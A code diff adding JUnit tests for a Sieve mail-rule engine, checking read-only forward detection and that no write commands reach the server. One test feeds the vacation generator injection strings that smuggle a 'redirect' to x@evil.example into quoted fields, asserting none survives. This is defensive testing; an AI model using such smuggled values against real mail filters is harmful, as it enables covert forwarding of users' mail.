@@ -27,6 +27,7 @@ import static org.mockito.Mockito.mock;
 import java.time.Clock;
 import java.time.Instant;
 import java.time.ZoneOffset;
+import java.util.List;
 
 import javax.mail.PasswordAuthentication;
 
@@ -38,6 +39,8 @@ import org.exoplatform.emailConnector.exception.ServerRuleConflictException;
 import org.exoplatform.emailConnector.exception.ServerRuleUnavailableException;
 import org.exoplatform.emailConnector.exception.ServerRuleUnsupportedException;
 import org.exoplatform.emailConnector.model.EmailConnector;
+import org.exoplatform.emailConnector.model.ForwardingSetting;
+import org.exoplatform.emailConnector.model.ForwardingState;
 import org.exoplatform.emailConnector.model.ServerRuleCapabilities;
 import org.exoplatform.emailConnector.model.ServerVacation;
 import org.exoplatform.emailConnector.model.VacationSetting;
@@ -434,6 +437,142 @@ public class SieveRuleEngineTest {
     ServerVacation read = engine.readVacation(session);
     assertEquals(VacationState.MODIFIED, read.state());
     assertEquals("exo-main", read.foreignScriptName());
+  }
+
+  // ---------------------------------------------------------------------------------
+  // The forward, read only (EXO-90650): the running foreign script and its includes are
+  // scanned for redirect, never parsed, and nothing is ever written.
+  // ---------------------------------------------------------------------------------
+
+  /** The ManageSieve verbs that change what the server holds. */
+  private static final List<String> WRITE_VERBS = List.of("PUTSCRIPT", "SETACTIVE", "DELETESCRIPT", "RENAMESCRIPT");
+
+  /**
+   * Asserts the server received no command that writes, over the whole conversation.
+   */
+  private void assertNothingWritten() {
+    for (String verb : WRITE_VERBS) {
+      assertTrue(server.getCommands(verb).isEmpty(), verb + " was sent: " + server.getCommands());
+    }
+  }
+
+  /**
+   * How many commands that write the server received so far.
+   *
+   * @return the count, over every write verb
+   */
+  private int writeCount() {
+    return WRITE_VERBS.stream().mapToInt(verb -> server.getCommands(verb).size()).sum();
+  }
+
+  /**
+   * Another client's active script holding a redirect answers "a forward may be
+   * configured by" that script, without the destination, and writes nothing.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testAForeignRedirectMayForward() throws Exception {
+    server.script(FOREIGN, "require [\"copy\"];\nredirect :copy \"bob@stalwart.local\";\n", true);
+    ForwardingSetting forwarding = engine.readForwarding(session);
+    assertEquals(ForwardingState.MAY_FORWARD_BY_SCRIPT, forwarding.state());
+    assertEquals(FOREIGN, forwarding.scriptName());
+    assertTrue(forwarding.destinations().isEmpty());
+    assertNull(forwarding.keepCopy());
+    assertNothingWritten();
+  }
+
+  /**
+   * A foreign script without a redirect, or with the word only in a comment, forwards
+   * nothing; a script that is stored but not active is not what runs, so it is not
+   * scanned.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testNoRedirectForwardsNothing() throws Exception {
+    server.script(FOREIGN, "require [\"fileinto\"];\n# redirect \"x@y\";\nfileinto \"Archive\";\n", true);
+    server.script("dormant", "redirect \"bob@stalwart.local\";\n", false);
+    assertEquals(ForwardingState.NONE, engine.readForwarding(session).state());
+    assertNothingWritten();
+  }
+
+  /**
+   * No active script forwards nothing.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testNoActiveScriptForwardsNothing() throws Exception {
+    assertEquals(ForwardingSetting.none(), engine.readForwarding(session));
+    assertNothingWritten();
+  }
+
+  /**
+   * A redirect in a personal script the active one includes is found too, one level
+   * down, and the active script is the one named.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testARedirectOneIncludeDownMayForward() throws Exception {
+    server.script("forward", "redirect \"bob@stalwart.local\";\n", false);
+    server.script(FOREIGN, "require [\"include\"];\ninclude :personal \"forward\";\n", true);
+    ForwardingSetting forwarding = engine.readForwarding(session);
+    assertEquals(ForwardingState.MAY_FORWARD_BY_SCRIPT, forwarding.state());
+    assertEquals(FOREIGN, forwarding.scriptName());
+    assertNothingWritten();
+  }
+
+  /**
+   * Next to eXo's reply, in eXo's wrapper, the script scanned and named is the other
+   * client's one the wrapper includes -- not eXo's, not the wrapper.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testBehindEXosWrapperTheIncludedScriptIsNamed() throws Exception {
+    server.script(FOREIGN, "require [\"copy\"];\nredirect :copy \"bob@stalwart.local\";\n", true);
+    engine.writeVacation(session, reply(true, "Back on Monday"), 7, null);
+    assertEquals(ExoSieveScript.WRAPPER_NAME, server.getActive());
+    int writes = writeCount();
+    ForwardingSetting forwarding = engine.readForwarding(session);
+    assertEquals(ForwardingState.MAY_FORWARD_BY_SCRIPT, forwarding.state());
+    assertEquals(FOREIGN, forwarding.scriptName());
+    assertEquals(writes, writeCount());
+  }
+
+  /**
+   * Only eXo's own script running forwards nothing: its generator emits no redirect, and
+   * the read does not scan it -- a user's reply that mentions the word is not a forward.
+   *
+   * @throws Exception on failure
+   */
+  @Test
+  public void testEXosOwnScriptNeverForwards() throws Exception {
+    engine.writeVacation(session, reply(true, "Mail is not redirected while I am away"), 7, null);
+    assertEquals(ExoSieveScript.SCRIPT_NAME, server.getActive());
+    assertEquals(ForwardingState.NONE, engine.readForwarding(session).state());
+  }
+
+  /**
+   * eXo's generator never emits a redirect command in this phase: whatever the user types,
+   * once comments and quoted strings are set aside, eXo's script holds no redirect.
+   */
+  @Test
+  public void testTheGeneratorEmitsNoRedirect() {
+    ExoSieveScript script = ExoSieveScript.empty()
+                                          .withVacation(new ExoSieveScript.Vacation(true,
+                                                                                    java.time.LocalDate.of(2026, 10, 1),
+                                                                                    java.time.LocalDate.of(2026, 10, 15),
+                                                                                    "Europe/Paris",
+                                                                                    "\"; redirect \"x@evil.example\"; #",
+                                                                                    "redirect \"x@evil.example\";\n/* */ redirect",
+                                                                                    "exo-vacation-1",
+                                                                                    7));
+    String code = SieveTokenScan.withoutComments(script.toScript()).replaceAll("\"(?:[^\"\\\\]|\\\\.)*\"", "\"\"");
+    assertFalse(SieveTokenScan.containsWord(code, SieveScriptPolicy.REDIRECT_TOKEN), code);
+    assertTrue(SieveTokenScan.containsWord(code, SieveScriptPolicy.VACATION_TOKEN), code);
   }
 
   /**
